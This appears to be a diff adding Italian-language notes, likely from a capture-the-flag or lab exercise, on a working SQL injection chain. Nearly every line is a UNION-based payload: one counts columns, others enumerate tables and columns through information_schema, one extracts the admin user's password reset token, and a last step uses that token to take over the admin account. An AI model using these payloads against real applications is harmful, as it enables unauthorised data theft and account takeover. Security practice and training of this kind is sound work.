@@ -1,0 +1,12 @@
+RICORDARSI DI URL ENCODARE TUTTO!
+
+1' GROUP BY 3 #						-->		GOOD
+1' AND 1=2 UNION SELECT 1,2,3 #		-->		GOOD
+1' AND 1=2 UNION SELECT 1,table_name,3 FROM information_schema.tables WHERE table_schema = DATABASE() LIMIT 1,1 #		--> RECUPERA LE TABELLE (cambiare offset di LIMIT)
+1' AND 1=2 UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name = "users" LIMIT 0,1 #		--> RECUPERA LE COLONNE DI 'users'	(cambiare offset di LIMIT)
+
+colonne users: username, email, password_hash, reset_token
+
+1' AND 1=2 UNION SELECT 1,reset_token,3 FROM users WHERE username = "admin" #		-->		RECUPERA reset_token DI admin
+
+PRENDERE IL reset_token E RESETTARE LA PASSWORD DI ADMIN PER ACCEDERVI SUCCESSIVAMENTE AL RESET DELLA PASSWORD
